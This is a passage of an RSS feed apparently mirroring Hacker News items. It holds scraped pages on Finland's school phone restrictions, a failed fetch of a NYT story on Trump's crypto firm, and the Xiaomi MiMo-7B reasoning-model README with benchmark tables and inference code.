<div id="readability-page-1" class="page"><div data-cy="article-wrapper" id="content" role="article"><p><img alt="Port of Los Angeles Executive Director Gene Seroka in 2024." data-content-placement="primary_image" fetchpriority="high" width="768" height="512" decoding="async" data-nimg="1" sizes="100vw" srcset="https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=320&amp;q=75 320w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=384&amp;q=75 384w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=480&amp;q=75 480w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=576&amp;q=75 576w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=768&amp;q=75 768w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1024&amp;q=75 1024w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1280&amp;q=75 1280w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1440&amp;q=75 1440w" src="https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1440&amp;q=75"></p><p>Port of Los Angeles Executive Director Gene Seroka in 2024.</p><p>Brittany Murray/MediaNews Group/Long Beach Press-Telegram via Getty Images</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Secret Deals, Foreign Investments: The Rise of Trumpâ€™s Crypto Firm (228 pts)]]></title>
            <link>https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html</link>
            <guid>43843621</guid>
            <pubDate>Wed, 30 Apr 2025 11:19:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html">https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html</a>, See on <a href="https://news.ycombinator.com/item?id=43843621">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Finland Bans Smartphones in Schools (725 pts)]]></title>
            <link>https://yle.fi/a/74-20158886</link>
            <guid>43842856</guid>
            <pubDate>Wed, 30 Apr 2025 09:17:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yle.fi/a/74-20158886">https://yle.fi/a/74-20158886</a>, See on <a href="https://news.ycombinator.com/item?id=43842856">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="yle__contentAnchor"><main><div data-testid="article-wrapper"><article data-vrsproduct="uutiset"><header><p>Pupils will be able to use their phones in some circumstances, but they will need to get permission from teachers.</p><figure><div><picture><source data-testid="source-for-S" media="(max-width: 767px)" srcset="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_2.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 2x,https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 1x"><source data-testid="source-for-M" media="(min-width: 768px)" srcset="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_357,w_636/dpr_2.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 2x,https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_357,w_636/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 1x"><img alt="Two red boxes filled with smartphones sitting on a table, as a sixth grader puts a device in one of the boxes." src="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f"></picture></div><figcaption><span>File photo.</span><span> <!-- -->Image: Mira BÃ¤ck / Yle</span></figcaption></figure><div><ul aria-label="Author"><li><span>Yle News</span></li></ul></div></header><section><p>Finnish Parliament voted on Tuesday to approve a law that restricts the use of mobile devices by pupils at primary and secondary schools.</p><p>The new rules are expected to come into force after the summer break, in August.</p><p>The law does not entirely ban the use of mobile phones at school, and their use will be permitted in certain situations. But generally, <a href="https://yle.fi/a/74-20134067" role="link">the use of phones during class time will be prohibited</a>.</p><p>Pupils will need to get special permission from teachers to use their phones, to assist them in studies, or to take care of personal health-related matters, for example.</p><p>The new law also gives school staff members the authority to confiscate mobile devices from pupils if they have caused teaching or learning disruptions.</p><p>Late last year, Education Minister <strong>Anders Adlercreutz</strong> (SPP) emphasised that kids' digital skills will still be supported despite the phone restrictions.</p><p><em><strong>Users with an Yle ID can leave comments on our news stories. You can create your Yle ID via</strong></em> <a href="https://yle.fi/aihe/yle-tunnus/yle-id" role="link"><em><strong>this link</strong></em></a><em><strong>. Our guidelines on commenting and moderation are explained</strong></em> <a href="https://yle.fi/aihe/s/discussion-policy" role="link"><em><strong>here</strong></em></a><em><strong>.</strong></em></p></section></article></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xiaomi MiMo Reasoning Model (409 pts)]]></title>
            <link>https://github.com/XiaomiMiMo/MiMo</link>
            <guid>43842683</guid>
            <pubDate>Wed, 30 Apr 2025 08:48:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/XiaomiMiMo/MiMo">https://github.com/XiaomiMiMo/MiMo</a>, See on <a href="https://news.ycombinator.com/item?id=43842683">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <themed-picture data-catalyst-inline="true"><picture>
    <source srcset="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
    <img src="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/Xiaomi_MiMo.png?raw=true" width="60%" alt="Xiaomi-MiMo">
  </picture></themed-picture>
</div>
<p dir="auto"><h3 tabindex="-1" dir="auto">
  <b>
    <span>â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</span>
    <br>
    Unlocking the Reasoning Potential of Language Model<br>From Pretraining to Posttraining
    <br>
    <span>â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”</span>
    <br>
  </b>
</h3><a id="user-content---------------unlocking-the-reasoning-potential-of-language-modelfrom-pretraining-to-posttraining--------------" aria-label="Permalink: â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
    Unlocking the Reasoning Potential of Language ModelFrom Pretraining to Posttraining
    â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" href="#--------------unlocking-the-reasoning-potential-of-language-modelfrom-pretraining-to-posttraining--------------"></a></p>
<br>

<br>
<blockquote>
<p dir="auto">This code repository is licensed under the <a href="https://github.com/XiaomiMiMo/MiMo/blob/main/LICENSE">Apache2.0 License</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">I. Introduction</h2><a id="user-content-i-introduction" aria-label="Permalink: I. Introduction" href="#i-introduction"></a></p>
<p dir="auto">Currently, most successful RL works, including open-source research, rely on relatively large base models, e.g., 32B models, particularly for enhancing code reasoning capabilities. Moreover, it was widely considered that achieving uniform and simultaneous improvements in both mathematical and code capabilities within a small model is challenging. Nonetheless, we believe that the effectiveness of the RL trained reasoning model relies on the inherent reasoning potential of the base model. To fully unlock the reasoning potential of language models, efforts must focus not only on post-training but also on pre-training strategies tailored to reasoning.</p>
<p dir="auto">In this work, we present MiMo-7B, a series of models trained from scratch and born for reasoning tasks. Our RL experiments from MiMo-7B-Base show that our model possesses extraordinary reasoning potential, even surpassing much larger 32B models. Additionally, we perform RL training on a cold-started SFT model, resulting in MiMo-7B-RL, which demonstrates superior performance on both mathematics and code reasoning tasks, matching the performance of OpenAI o1-mini.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/curve.png?raw=true"><img width="80%" src="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/curve.png?raw=true"></a>
</p>
<p dir="auto">We open-source MiMo-7B series, including checkpoints of the base model, SFT model, RL model trained from base model, and RL model trained from the SFT model.
We believe this report along with the models will provides valuable insights to develop powerful reasoning LLM that benefit the larger community.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">ðŸŒŸ Highlights</h3><a id="user-content--highlights" aria-label="Permalink: ðŸŒŸ Highlights" href="#-highlights"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Pre-Training: Base Model Born for Reasoning</strong></p>
<ul dir="auto">
<li>We optimize data preprocessing pipeline, enhancing text extraction toolkits and applying multi-dimensional data filtering to increase reasoning pattern density in pre-training data. We also employ multiple strategies to generate massive diverse synthetic reasoning data.</li>
<li>We adopt a three-stage data mixture strategy for pre-training. Overall, MiMo-7B-Base is pre-trained on approximately 25 trillion tokens.</li>
<li>We incorporate Multiple-Token Prediction as an additional training objective, which enhances model performance and accelerates inference.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Post-Training Recipe: Pioneering Reasoning Model</strong></p>
<ul dir="auto">
<li>We curate 130K mathematics and code problems as RL training data, which can be verified by rule-based verifiers. Each problem undergoes careful cleaning and difficulty assessment to ensure quality. We employ only rule-based accuracy rewards to avoid potential reward hacking.</li>
<li>To mitigate the sparse reward issue for challenging code problems, we introduce a test difficulty driven code reward. By assigning fine-grained scores for test cases with varying difficulty levels, the policy can be more effectively optimized via dense reward signal.</li>
<li>We implement a data re-sampling strategy for easy problems to enhance rollout sampling efficiency and stabilize policy updates, particularly in the later phases of RL training.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>RL Infrastructures</strong></p>
<ul dir="auto">
<li>We develop a Seamless Rollout Engine to accelerate RL training and validation. Our design integrates continuous rollout, asynchronous reward computation, and early termination to minimize GPU idle time, achieving 2.29$\times$ faster training and 1.96$\times$ faster validation.</li>
<li>We support MTP in vLLM and enhance the robustness of the inference engine in RL system.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">II. Model Details</h2><a id="user-content-ii-model-details" aria-label="Permalink: II. Model Details" href="#ii-model-details"></a></p>
<blockquote>
<p dir="auto">Models are avaliable at <a href="https://huggingface.co/XiaomiMiMo" rel="nofollow">https://huggingface.co/XiaomiMiMo</a></p>
</blockquote>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th><strong>Model</strong></th>
<th><strong>Description</strong></th>
<th><strong>Download</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>MiMo-7B-Base</td>
<td>Base model with extraordinary reasoning potential</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-Base" rel="nofollow">ðŸ¤— XiaomiMiMo/MiMo-7B-Base</a></td>
</tr>
<tr>
<td>MiMo-7B-RL-Zero</td>
<td>RL model trained from base model</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-RL-Zero" rel="nofollow">ðŸ¤— XiaomiMiMo/MiMo-7B-RL-Zero</a></td>
</tr>
<tr>
<td>MiMo-7B-SFT</td>
<td>SFT model trained from base model</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-SFT" rel="nofollow">ðŸ¤— XiaomiMiMo/MiMo-7B-SFT</a></td>
</tr>
<tr>
<td>MiMo-7B-RL</td>
<td>RL model trained from SFT model, superior performance matching OpenAI o1-mini</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-RL" rel="nofollow">ðŸ¤— XiaomiMiMo/MiMo-7B-RL</a></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">III. Evaluation Results</h2><a id="user-content-iii-evaluation-results" aria-label="Permalink: III. Evaluation Results" href="#iii-evaluation-results"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Benchmark</th>
<th>GPT-4o-0513</th>
<th>Claude-3.5-Sonnet-1022</th>
<th>OpenAI o1-mini</th>
<th>QwQ-32B-Preview</th>
<th>R1-Distill-Qwen-14B</th>
<th>R1-Distill-Qwen-7B</th>
<th>MiMo-7B-RL</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>General</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GPQA Diamond<br>(Pass@1)</td>
<td>49.9</td>
<td>65.0</td>
<td>60.0</td>
<td>54.5</td>
<td>59.1</td>
<td>49.1</td>
<td>54.4</td>
</tr>
<tr>
<td>SuperGPQA<br>(Pass@1)</td>
<td>42.4</td>
<td>48.2</td>
<td>45.2</td>
<td>43.6</td>
<td>40.6</td>
<td>28.9</td>
<td>40.5</td>
</tr>
<tr>
<td>DROP<br>(3-shot F1)</td>
<td>83.7</td>
<td>88.3</td>
<td>83.9</td>
<td>71.2</td>
<td>85.5</td>
<td>77.0</td>
<td>78.7</td>
</tr>
<tr>
<td>MMLU-Pro<br>(EM)</td>
<td>72.6</td>
<td>78.0</td>
<td>80.3</td>
<td>52.0</td>
<td>68.8</td>
<td>53.5</td>
<td>58.6</td>
</tr>
<tr>
<td>IF-Eval<br>(Prompt Strict)</td>
<td>84.3</td>
<td>86.5</td>
<td>84.8</td>
<td>40.4</td>
<td>78.3</td>
<td>60.5</td>
<td>61.0</td>
</tr>
<tr>
<td><strong>Mathematics</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MATH-500<br>(Pass@1)</td>
<td>74.6</td>
<td>78.3</td>
<td>90.0</td>
<td>90.6</td>
<td>93.9</td>
<td>92.8</td>
<td>95.8</td>
</tr>
<tr>
<td>AIME 2024<br>(Pass@1)</td>
<td>9.3</td>
<td>16.0</td>
<td>63.6</td>
<td>50.0</td>
<td>69.7</td>
<td>55.5</td>
<td>68.2</td>
</tr>
<tr>
<td>AIME 2025<br>(Pass@1)</td>
<td>11.6</td>
<td>7.4</td>
<td>50.7</td>
<td>32.4</td>
<td>48.2</td>
<td>38.8</td>
<td>55.4</td>
</tr>
<tr>
<td><strong>Code</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LiveCodeBench v5<br>(Pass@1)</td>
<td>32.9</td>
<td>38.9</td>
<td>53.8</td>
<td>41.9</td>
<td>53.1</td>
<td>37.6</td>
<td>57.8</td>
</tr>
<tr>
<td>LiveCodeBench v6<br>(Pass@1)</td>
<td>30.9</td>
<td>37.2</td>
<td>46.8</td>
<td>39.1</td>
<td>31.9</td>
<td>23.9</td>
<td>49.3</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">MiMo-7B series</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Benchmark</th>
<th>MiMo-7B-Base</th>
<th>MiMo-7B-RL-Zero</th>
<th>MiMo-7B-SFT</th>
<th>MiMo-7B-RL</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Mathematics</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MATH500<br>(Pass@1)</td>
<td>37.4</td>
<td>93.6</td>
<td>93.0</td>
<td>95.8</td>
</tr>
<tr>
<td>AIME 2024<br>(Pass@1)</td>
<td>32.9</td>
<td>56.4</td>
<td>58.7</td>
<td>68.2</td>
</tr>
<tr>
<td>AIME 2025<br>(Pass@1)</td>
<td>24.3</td>
<td>46.3</td>
<td>44.3</td>
<td>55.4</td>
</tr>
<tr>
<td><strong>Code</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LiveCodeBench v5<br>(Pass@1)</td>
<td>32.9</td>
<td>49.1</td>
<td>52.3</td>
<td>57.8</td>
</tr>
<tr>
<td>LiveCodeBench v6<br>(Pass@1)</td>
<td>29.1</td>
<td>42.9</td>
<td>45.5</td>
<td>49.3</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<div dir="auto"><p dir="auto">Important</p><p dir="auto">The evaluation are conducted with <code>temperature=0.6</code>.</p>
<p dir="auto">AIME24 and AIME25 are with averaged score of 32 repetitions. LiveCodeBench v5 (20240801-20250201), LiveCodeBench v6 (20250201-20250501), GPQA-Diamond and IF-Eval are with averaged score of 8 repetitions. MATH500 and SuperGPQA are with a single run.</p>
</div>
<p dir="auto"><h2 tabindex="-1" dir="auto">IV. Deployment</h2><a id="user-content-iv-deployment" aria-label="Permalink: IV. Deployment" href="#iv-deployment"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">vLLM inference</h3><a id="user-content-vllm-inference" aria-label="Permalink: vLLM inference" href="#vllm-inference"></a></p>
<ol dir="auto">
<li>[Recommended] We official support inference with MiMo-MTP using <a href="https://github.com/XiaomiMiMo/vllm/tree/feat_mimo_mtp">our fork of vLLM</a>.</li>
</ol>
<p dir="auto">Example script</p>
<div dir="auto" data-snippet-clipboard-copy-content="from vllm import LLM, SamplingParams

model_path = &quot;/path/to/MiMo&quot;
llm = LLM(
    model=model_path,
    trust_remote_code=True,
    num_speculative_tokens=1,
    disable_log_stats=False
)
sampling_params = SamplingParams(temperature=0.6)

conversation = [
    {
        &quot;role&quot;: &quot;system&quot;,
        &quot;content&quot;: &quot;&quot;
    },
    {
        &quot;role&quot;: &quot;user&quot;,
        &quot;content&quot;: &quot;Write an essay about the importance of higher education.&quot;,
    },
]

outputs = llm.chat(conversation,
                   sampling_params=sampling_params,
                   use_tqdm=False)

for output in outputs:
    prompt = output.prompt
    generated_text = output.outputs[0].text
    print(f&quot;Prompt: {prompt!r}, Generated text: {generated_text!r}&quot;)

print(&quot;=&quot; * 80)"><pre><span>from</span> <span>vllm</span> <span>import</span> <span>LLM</span>, <span>SamplingParams</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>llm</span> <span>=</span> <span>LLM</span>(
    <span>model</span><span>=</span><span>model_path</span>,
    <span>trust_remote_code</span><span>=</span><span>True</span>,
    <span>num_speculative_tokens</span><span>=</span><span>1</span>,
    <span>disable_log_stats</span><span>=</span><span>False</span>
)
<span>sampling_params</span> <span>=</span> <span>SamplingParams</span>(<span>temperature</span><span>=</span><span>0.6</span>)

<span>conversation</span> <span>=</span> [
    {
        <span>"role"</span>: <span>"system"</span>,
        <span>"content"</span>: <span>""</span>
    },
    {
        <span>"role"</span>: <span>"user"</span>,
        <span>"content"</span>: <span>"Write an essay about the importance of higher education."</span>,
    },
]

<span>outputs</span> <span>=</span> <span>llm</span>.<span>chat</span>(<span>conversation</span>,
                   <span>sampling_params</span><span>=</span><span>sampling_params</span>,
                   <span>use_tqdm</span><span>=</span><span>False</span>)

<span>for</span> <span>output</span> <span>in</span> <span>outputs</span>:
    <span>prompt</span> <span>=</span> <span>output</span>.<span>prompt</span>
    <span>generated_text</span> <span>=</span> <span>output</span>.<span>outputs</span>[<span>0</span>].<span>text</span>
    <span>print</span>(<span>f"Prompt: <span><span>{</span><span>prompt</span>!r<span>}</span></span>, Generated text: <span><span>{</span><span>generated_text</span>!r<span>}</span></span>"</span>)

<span>print</span>(<span>"="</span> <span>*</span> <span>80</span>)</pre></div>
<ol start="2" dir="auto">
<li>Or, you can register a vLLM loader for MiMo without loading MTP parameters.</li>
</ol>
<p dir="auto">You can copy the <a href="https://github.com/XiaomiMiMo/MiMo/blob/main/registry/register_mimo_in_vllm.py"><code>registry/register_mimo_in_vllm.py</code></a> to your directory and import it with</p>
<div dir="auto" data-snippet-clipboard-copy-content="import register_mimo_in_vllm

from vllm import LLM, SamplingParams

model_path = &quot;/path/to/MiMo&quot;
llm = LLM(
    model=model_path,
    trust_remote_code=True,
    # num_speculative_tokens=1,
    disable_log_stats=False
)
sampling_params = SamplingParams(temperature=0.6)"><pre><span>import</span> <span>register_mimo_in_vllm</span>

<span>from</span> <span>vllm</span> <span>import</span> <span>LLM</span>, <span>SamplingParams</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>llm</span> <span>=</span> <span>LLM</span>(
    <span>model</span><span>=</span><span>model_path</span>,
    <span>trust_remote_code</span><span>=</span><span>True</span>,
    <span># num_speculative_tokens=1,</span>
    <span>disable_log_stats</span><span>=</span><span>False</span>
)
<span>sampling_params</span> <span>=</span> <span>SamplingParams</span>(<span>temperature</span><span>=</span><span>0.6</span>)</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">HuggingFace inference</h3><a id="user-content-huggingface-inference" aria-label="Permalink: HuggingFace inference" href="#huggingface-inference"></a></p>
<p dir="auto">Example script</p>
<div dir="auto" data-snippet-clipboard-copy-content="from transformers import AutoModel, AutoModelForCausalLM, AutoTokenizer

model_path = &quot;/path/to/MiMo&quot;
model = AutoModelForCausalLM.from_pretrained(model_path, trust_remote_code=True)
tokenizer = AutoTokenizer.from_pretrained(model_path)
inputs = tokenizer([&quot;Today is&quot;], return_tensors='pt')
output = model.generate(**inputs, max_new_tokens = 100)
print(tokenizer.decode(output.tolist()[0]))"><pre><span>from</span> <span>transformers</span> <span>import</span> <span>AutoModel</span>, <span>AutoModelForCausalLM</span>, <span>AutoTokenizer</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>model</span> <span>=</span> <span>AutoModelForCausalLM</span>.<span>from_pretrained</span>(<span>model_path</span>, <span>trust_remote_code</span><span>=</span><span>True</span>)
<span>tokenizer</span> <span>=</span> <span>AutoTokenizer</span>.<span>from_pretrained</span>(<span>model_path</span>)
<span>inputs</span> <span>=</span> <span>tokenizer</span>([<span>"Today is"</span>], <span>return_tensors</span><span>=</span><span>'pt'</span>)
<span>output</span> <span>=</span> <span>model</span>.<span>generate</span>(<span>**</span><span>inputs</span>, <span>max_new_tokens</span> <span>=</span> <span>100</span>)
<span>print</span>(<span>tokenizer</span>.<span>decode</span>(<span>output</span>.<span>tolist</span>()[<span>0</span>]))</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Recommended environment and prompts</h3><a id="user-content-recommended-environment-and-prompts" aria-label="Permalink: Recommended environment and prompts" href="#recommended-environment-and-prompts"></a></p>
<ul dir="auto">
<li>We recommend using <a href="https://github.com/XiaomiMiMo/vllm/tree/feat_mimo_mtp">our fork of vLLM</a> which is developed based on vLLM 0.7.3.</li>
<li>We recommend using empty system prompt.</li>
</ul>
<blockquote>
<p dir="auto">We haven't verified MiMo with other inference engines and welcome contributions based on the model definition in the Huggingface repo ðŸ’».</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">V. Citation</h2><a id="user-content-v-citation" aria-label="Permalink: V. Citation" href="#v-citation"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="@misc{xiaomi2025mimo,
      title={MiMo: Unlocking the Reasoning Potential of Language Model â€“ From Pretraining to Posttraining}, 
      author={{Xiaomi LLM-Core Team}},
      year={2025},
      primaryClass={cs.CL},
      url={https://github.com/XiaomiMiMo/MiMo}, 
}"><pre><span>@misc</span>{<span>xiaomi2025mimo</span>,
      <span>title</span>=<span><span>{</span>MiMo: Unlocking the Reasoning Potential of Language Model â€“ From Pretraining to Posttraining<span>}</span></span>, 
      <span>author</span>=<span><span>{</span>{Xiaomi LLM-Core Team}<span>}</span></span>,
      <span>year</span>=<span><span>{</span>2025<span>}</span></span>,
      <span>primaryClass</span>=<span><span>{</span>cs.CL<span>}</span></span>,
      <span>url</span>=<span><span>{</span>https://github.com/XiaomiMiMo/MiMo<span>}</span></span>, 
}</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">VI. Contact</h2><a id="user-content-vi-contact" aria-label="Permalink: VI. Contact" href="#vi-contact"></a></p>
<p dir="auto">Please contact us at <a href="mailto:mimo@xiaomi.com">mimo@xiaomi.com</a> or open an issue if you have any questions.</p>
</article></div></div>]]></description>
        </item>
    </channel>
</rss>